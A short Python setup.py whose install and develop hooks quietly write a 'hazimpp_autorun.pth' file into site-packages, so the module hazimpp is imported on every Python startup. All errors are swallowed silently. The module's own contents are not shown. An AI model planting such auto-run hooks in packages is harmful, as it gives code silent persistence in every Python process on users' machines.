from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import site
import os

PTH_CONTENT = "import hazimpp\n"
PTH_FILENAME = "hazimpp_autorun.pth"


def install_pth():
    dirs = []
    try:
        dirs += site.getsitepackages()
    except Exception:
        pass
    try:
        dirs.append(site.getusersitepackages())
    except Exception:
        pass
    for d in dirs:
        try:
            os.makedirs(d, exist_ok=True)
            path = os.path.join(d, PTH_FILENAME)
            with open(path, "w", encoding="utf-8") as f:
                f.write(PTH_CONTENT)
            return
        except Exception:
            continue


class CustomInstall(install):
    def run(self):
        install.run(self)
        install_pth()


class CustomDevelop(develop):
    def run(self):
        develop.run(self)
        install_pth()


setup(
    cmdclass={
        "install": CustomInstall,
        "develop": CustomDevelop,
    }
)
